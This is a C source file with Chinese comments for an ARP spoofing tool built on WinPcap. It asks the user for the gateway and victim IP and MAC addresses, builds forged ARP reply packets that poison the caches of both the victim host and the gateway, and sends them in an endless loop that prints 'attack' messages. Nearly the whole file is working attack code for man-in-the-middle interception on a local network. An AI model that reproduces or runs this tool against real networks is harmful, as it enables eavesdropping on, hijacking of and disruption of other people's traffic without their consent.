#include <stdio.h>
#include <pcap.h>
#include "arp_spoof.h"

//const unsigned char VICTIM_MAC[MAC_LEN]	= {0x00, 0x21, 0x00, 0x38, 0xD4, 0xC4};	//被攻击方的MAC
//const unsigned char GATEWAY_MAC[MAC_LEN] = {0xC0, 0x3F, 0x0E, 0xB8, 0x36, 0x1C}; //网关的MAC
//const unsigned char FAKE_MAC[MAC_LEN] = {0x00, 0x21, 0x5D, 0x1E, 0x9B, 0xE2};	//攻击者的MAC
//const char  VICTIM_IP[]	= "10.0.0.8";	//被攻击方IP
//const char	GATEWAY_IP[] = "10.0.0.1";	//网关IP 

char errbuf[PCAP_ERRBUF_SIZE];
char  VICTIM_IP[20];
char	GATEWAY_IP[20];
unsigned char FAKE_MAC[MAC_LEN];
unsigned char GATEWAY_MAC[MAC_LEN];
unsigned char VICTIM_MAC[MAC_LEN];
//选择网卡
int select_adapter(pcap_t **handle) {
	pcap_if_t *alldevs;
	pcap_if_t *d;
	int inum;
	int i=0;

	
	/* Retrieve the device list */
	if(pcap_findalldevs(&alldevs, errbuf) == -1)
	{
		fprintf(stderr,"Error in pcap_findalldevs: %s\n", errbuf);
		exit(1);
	}
	
	/* Print the list */
	for(d=alldevs; d; d=d->next)
	{
		printf("%d. %s", ++i, d->name);
		if (d->description)
			printf(" (%s)\n", d->description);
		else
			printf(" (No description available)\n");
	}
	
	if(i==0)
	{
		printf("\nNo interfaces found! Make sure WinPcap is installed.\n");
		return -1;
	}
	
	printf("Enter the interface number (1-%d):",i);
	scanf("%d", &inum);
	
	if(inum < 1 || inum > i)
	{
		printf("\nInterface number out of range.\n");
		/* Free the device list */
		pcap_freealldevs(alldevs);
		return -1;
	}
	
	/* Jump to the selected adapter */
	for(d=alldevs, i=0; i< inum-1 ;d=d->next, i++);
	
	/* Open the device */
	/* Open the adapter */
	if ((*handle= pcap_open_live(d->name,	// name of the device
							 65536,			// portion of the packet to capture. 
											// 65536 grants that the whole packet will be captured on all the MACs.
							 PCAP_OPENFLAG_PROMISCUOUS,				// promiscuous mode (nonzero means promiscuous)
							 1000,			// read timeout
							 errbuf			// error buffer
							 )) == NULL)
	{
		fprintf(stderr,"\nUnable to open the adapter. %s is not supported by WinPcap\n", d->name);
		/* Free the device list */
		pcap_freealldevs(alldevs);
		return -1;
	}
	
	printf("Successfully Open the adapter <%s> \n", d->description);

	return TRUE;
}


#define TO_VICTIM_HOST		1
#define TO_VICTIM_GATEWAY	2
//构造攻击数据包
int make_pkt(ARP_PKT *pkt, int flag) {
	int i;

	for (i = 0; i < MAC_LEN; i++) 
		pkt->eth_hdr.src_mac[i] = pkt->arp_hdr.src_mac[i] = FAKE_MAC[i];
	pkt->eth_hdr.type = htons(0x0806);
	pkt->arp_hdr.hardware_type = htons(0x1);
	pkt->arp_hdr.protocol_type = htons(0x800);
	pkt->arp_hdr.hardware_len = 6;
	pkt->arp_hdr.protocol_len = 4;
	pkt->arp_hdr.option = htons(0x2);
	
	if (flag == TO_VICTIM_HOST) {
		for (i = 0; i < MAC_LEN; i++) 
			pkt->eth_hdr.dst_mac[i] = pkt->arp_hdr.dst_mac[i] =  VICTIM_MAC[i];
		pkt->arp_hdr.src_ip = inet_addr(GATEWAY_IP);
		pkt->arp_hdr.dst_ip = inet_addr(VICTIM_IP);
	}
	else if (flag == TO_VICTIM_GATEWAY) {
		for (i = 0; i < MAC_LEN; i++)
			pkt->eth_hdr.dst_mac[i] = pkt->arp_hdr.dst_mac[i] = GATEWAY_MAC[i];
		pkt->arp_hdr.src_ip = inet_addr(VICTIM_IP);
		pkt->arp_hdr.dst_ip = inet_addr(GATEWAY_IP);
	}
	else  {
		printf("flag error..!\n");
		return -1;
	}
	return TRUE;
} 

int getmac(unsigned char* mac)
{
	int i;
	int c;
	for(i = 0; i < MAC_LEN; i++)
	{
		scanf("%x",&c);
		mac[i] = c;
	}
	return 0;
}

int main() {
	pcap_t *handle = 0;
	//数据包
	ARP_PKT pkt_host, pkt_gateway;
	printf("输入网关ip：");
	scanf("%s",GATEWAY_IP);
	printf("输入被攻击者的ip：");
	scanf("%s",VICTIM_IP);
	printf("输入网关mac(十六进制数0x..以空格隔开)：");
	getmac(GATEWAY_MAC); 
	printf("输入被攻击者的mac：");
	getmac(VICTIM_MAC); 
	printf("输入希望伪造的mac：");
	getmac(FAKE_MAC); 
	//选择网卡接口
	if (!select_adapter(&handle))
		return -1;

	//构造数据包
	make_pkt(&pkt_host, TO_VICTIM_HOST);
	make_pkt(&pkt_gateway, TO_VICTIM_GATEWAY);

	//发送构造的数据报
	while (1) {
		if (pcap_sendpacket(handle, (unsigned char *)&pkt_host, sizeof(ARP_PKT)) != 0)
			fprintf(stderr,"\nError sending the packet: \n", pcap_geterr(handle));
		else
			printf("attack %s...\n", VICTIM_IP);

		if (pcap_sendpacket(handle, (unsigned char *)&pkt_gateway, sizeof(ARP_PKT)) != 0)
			fprintf(stderr,"\nError sending the packet: \n", pcap_geterr(handle));
		else
			printf("attack %s...\n", GATEWAY_IP);
	}
	return 0;
}